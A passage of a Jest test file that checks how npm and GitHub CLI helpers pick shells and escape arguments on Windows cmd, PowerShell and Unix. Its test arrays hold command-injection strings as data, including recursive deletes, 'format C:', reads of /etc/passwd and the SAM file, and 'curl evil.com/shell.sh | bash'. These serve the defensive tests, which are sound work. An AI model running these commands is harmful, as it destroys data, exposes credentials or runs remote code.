        expect(result.isError).toBe(false);
        // Verify PowerShell-style single quote escaping
        expect(mockExec).toHaveBeenCalledWith(
          "npm view 'test package' 'test&malicious' 'test<input' 'test>output' 'test|pipe' 'test;separator' 'test`backtick' 'test$variable' 'test@symbol' 'test\"quote' 'test''single' 'test(paren)' 'test[bracket]' 'test{brace}' safe-arg safe.arg safe_arg",
          expect.any(Object),
          expect.any(Function)
        );
      });

      it('should handle PowerShell injection attempts safely', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'safe execution', stderr: '' });
        });

        const powershellInjectionAttempts = [
          'test; Remove-Item -Path C:\\ -Recurse', // Command separator
          'test & Remove-Item C:\\*', // Background execution
          'test | Get-Content C:\\Windows\\System32\\config\\sam', // Pipe
          'test > C:\\malicious.ps1', // Redirect
          'test < C:\\Windows\\System32\\drivers\\etc\\hosts', // Input redirect
          'test $(Remove-Item C:\\)', // Command substitution
          'test `Remove-Item C:\\`', // Backtick substitution
          'test $env:TEMP\\malicious', // Environment variable
          'test @("evil", "command")', // Array syntax
          'test {Remove-Item C:\\}', // Script block
          'test (Get-Process)', // Expression
          'test [System.IO.File]::Delete("C:\\")', // .NET method call
        ];

        const result = await executeNpmCommand(
          'view',
          powershellInjectionAttempts,
          {
            windowsShell: 'powershell',
          }
        );

        expect(result.isError).toBe(false);
        // Verify all dangerous patterns are quoted in the command string
        const actualCommand = mockExec.mock.calls[0][0];
        expect(actualCommand).toContain("'test; Remove-Item -Path C:\\ -Recurse'");
        expect(actualCommand).toContain("'test & Remove-Item C:\\*'");
        expect(actualCommand).toContain("'test | Get-Content C:\\Windows\\System32\\config\\sam'");
        expect(actualCommand).toContain("'test > C:\\malicious.ps1'");
        expect(actualCommand).toContain("'test $(Remove-Item C:\\)'");
        expect(actualCommand).toContain("'test `Remove-Item C:\\`'");
        expect(actualCommand).toContain("'test $env:TEMP\\malicious'");
        expect(actualCommand).toContain("'test @(\"evil\", \"command\")'");
        expect(actualCommand).toContain("'test {Remove-Item C:\\}'");
        expect(actualCommand).toContain("'test (Get-Process)'");
        expect(actualCommand).toContain("'test [System.IO.File]::Delete(\"C:\\\")'");
      });

      it('should work with GitHub CLI commands in PowerShell', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: '[]', stderr: '' });
        });

        const result = await executeGitHubCommand('search', ['repos', 'test'], {
          windowsShell: 'powershell',
        });

        expect(result.isError).toBe(false);
        expect(mockExec).toHaveBeenCalledWith(
          'gh search repos test',
          expect.objectContaining({
            shell: 'powershell.exe',
            env: expect.objectContaining({
              SHELL: 'powershell.exe',
            }),
          }),
          expect.any(Function)
        );

        const data = JSON.parse(result.content[0].text as string);
        expect(data.shellType).toBe('powershell');
      });

      it('should include shell type in cache key for PowerShell', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'cached result', stderr: '' });
        });

        await executeNpmCommand('view', ['test'], {
          cache: true,
          windowsShell: 'powershell',
        });

        expect(mockGenerateCacheKey).toHaveBeenCalledWith('npm-exec', {
          command: 'view',
          args: ['test'],
          shell: 'powershell',
        });
      });
    });

    describe('Unix/Linux/macOS Platform Behavior', () => {
      beforeEach(() => {
        // Mock platform to return non-Windows values
        mockPlatform.mockReturnValue('darwin'); // macOS
      });

      it('should use /bin/sh shell on Unix systems', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        const result = await executeNpmCommand('view', ['test']);

        expect(result.isError).toBe(false);
        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            shell: '/bin/sh',
            env: expect.objectContaining({
              SHELL: '/bin/sh',
            }),
          }),
          expect.any(Function)
        );

        const data = JSON.parse(result.content[0].text as string);
        expect(data.platform).toBe('darwin');
        expect(data.shell).toBe('/bin/sh');
        expect(data.shellType).toBe('unix');
      });

      it('should ignore windowsShell option on Unix systems', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        const result = await executeNpmCommand('view', ['test'], {
          windowsShell: 'powershell', // Should be ignored on Unix
        });

        expect(result.isError).toBe(false);
        expect(mockExec).toHaveBeenCalledWith(
          expect.any(String),
          expect.objectContaining({
            shell: '/bin/sh', // Should still use /bin/sh
          }),
          expect.any(Function)
        );

        const data = JSON.parse(result.content[0].text as string);
        expect(data.shellType).toBe('unix');
      });

      it('should use Unix-style argument escaping', async () => {
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'success', stderr: '' });
        });

        // Test Unix shell special characters that need escaping
        const unixSpecialArgs = [
          'test package', // Space - should be quoted
          'test;malicious', // ; - should be quoted
          'test&background', // & - should be quoted
          'test|pipe', // | - should be quoted
          'test>redirect', // > - should be quoted
          'test<input', // < - should be quoted
          'test$(command)', // $() - should be quoted
          'test`command`', // `` - should be quoted
          'test*glob', // * - should be quoted
          'test?wildcard', // ? - should be quoted
          'test[range]', // [] - should be quoted
          'test{brace}', // {} - should be quoted
          "test'quote", // ' - should be quoted and escaped
          'safe-arg', // Safe arg - should not be quoted
          'safe.arg', // Safe arg - should not be quoted
          'safe_arg', // Safe arg - should not be quoted
          'safe/path', // Safe path - should not be quoted
          'safe:value', // Safe colon - should not be quoted
          'safe=value', // Safe equals - should not be quoted
          '@scope/package', // Safe @ - should not be quoted
        ];

        const result = await executeNpmCommand('view', unixSpecialArgs);

        expect(result.isError).toBe(false);
        // Verify Unix-style single quote escaping
        expect(mockExec).toHaveBeenCalledWith(
          "npm view 'test package' 'test;malicious' 'test&background' 'test|pipe' 'test>redirect' 'test<input' 'test$(command)' 'test`command`' 'test*glob' 'test?wildcard' 'test[range]' 'test{brace}' 'test'\"'\"'quote' safe-arg safe.arg safe_arg safe/path safe:value safe=value @scope/package",
          expect.any(Object),
          expect.any(Function)
        );
      });
    });

    describe('Cross-Platform Security Validation', () => {
      it('should prevent injection attempts on Windows CMD', async () => {
        mockPlatform.mockReturnValue('win32');
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'safe execution', stderr: '' });
        });

        const windowsInjectionAttempts = [
          'test & del /f /q C:\\*', // Command chaining
          'test && rmdir /s /q C:\\', // Logical AND
          'test || format C:', // Logical OR
          'test | type C:\\Windows\\System32\\config\\sam', // Pipe
          'test > C:\\malicious.bat', // Redirect
          'test < C:\\Windows\\System32\\drivers\\etc\\hosts', // Input redirect
          'test^&^echo^malicious', // Escaped characters
        ];

        const result = await executeNpmCommand(
          'view',
          windowsInjectionAttempts
        );

        expect(result.isError).toBe(false);
        // Verify all dangerous characters are properly quoted
        expect(mockExec).toHaveBeenCalledWith(
          expect.stringContaining('"test & del /f /q C:\\*"'),
          expect.any(Object),
          expect.any(Function)
        );
      });

      it('should prevent injection attempts on Unix', async () => {
        mockPlatform.mockReturnValue('linux');
        mockExec.mockImplementation((cmd, opts, callback) => {
          callback(null, { stdout: 'safe execution', stderr: '' });
        });

        const unixInjectionAttempts = [
          'test; rm -rf /', // Command separator
          'test && rm -rf /usr', // Logical AND
          'test || rm -rf /etc', // Logical OR
          'test | cat /etc/passwd', // Pipe
          'test > /etc/shadow', // Redirect
          'test < /etc/passwd', // Input redirect
          'test $(rm -rf /)', // Command substitution
          'test `rm -rf /`', // Backtick substitution
          'test & curl evil.com/shell.sh | bash', // Background + pipe
          'test *', // Glob expansion
          'test {a,b,c}', // Brace expansion
          'test [a-z]*', // Character range
        ];

        const result = await executeNpmCommand('view', unixInjectionAttempts);

        expect(result.isError).toBe(false);
        // Verify all dangerous patterns are quoted
        expect(mockExec).toHaveBeenCalledWith(
          expect.stringContaining("'test; rm -rf /'"),
          expect.any(Object),
          expect.any(Function)
        );
      });
    });

    describe('Shell Type Detection and Behavior', () => {
      it('should correctly detect shell type across platforms', async () => {
        const testCases = [
          {
            platform: 'win32',
            windowsShell: undefined,
            expectedShell: 'cmd.exe',
            expectedType: 'cmd',
          },
          {
            platform: 'win32',
            windowsShell: 'cmd' as const,
            expectedShell: 'cmd.exe',
            expectedType: 'cmd',
          },
          {
            platform: 'win32',
            windowsShell: 'powershell' as const,
            expectedShell: 'powershell.exe',
            expectedType: 'powershell',
          },
          {
            platform: 'darwin',
            windowsShell: undefined,
            expectedShell: '/bin/sh',
            expectedType: 'unix',
          },
          {
            platform: 'linux',
            windowsShell: 'powershell' as const, // Should be ignored
            expectedShell: '/bin/sh',
            expectedType: 'unix',
          },
        ];

        for (const testCase of testCases) {
          mockPlatform.mockReturnValue(testCase.platform);
          mockExec.mockImplementation((cmd, opts, callback) => {
            callback(null, { stdout: 'success', stderr: '' });
          });

          const result = await executeNpmCommand('view', ['test'], {
            windowsShell: testCase.windowsShell,
          });

          expect(result.isError).toBe(false);
          expect(mockExec).toHaveBeenCalledWith(
            expect.any(String),
            expect.objectContaining({
              shell: testCase.expectedShell,
            }),
            expect.any(Function)
          );

          const data = JSON.parse(result.content[0].text as string);
          expect(data.shell).toBe(testCase.expectedShell);
          expect(data.shellType).toBe(testCase.expectedType);
        }
      });
    });
  });
});
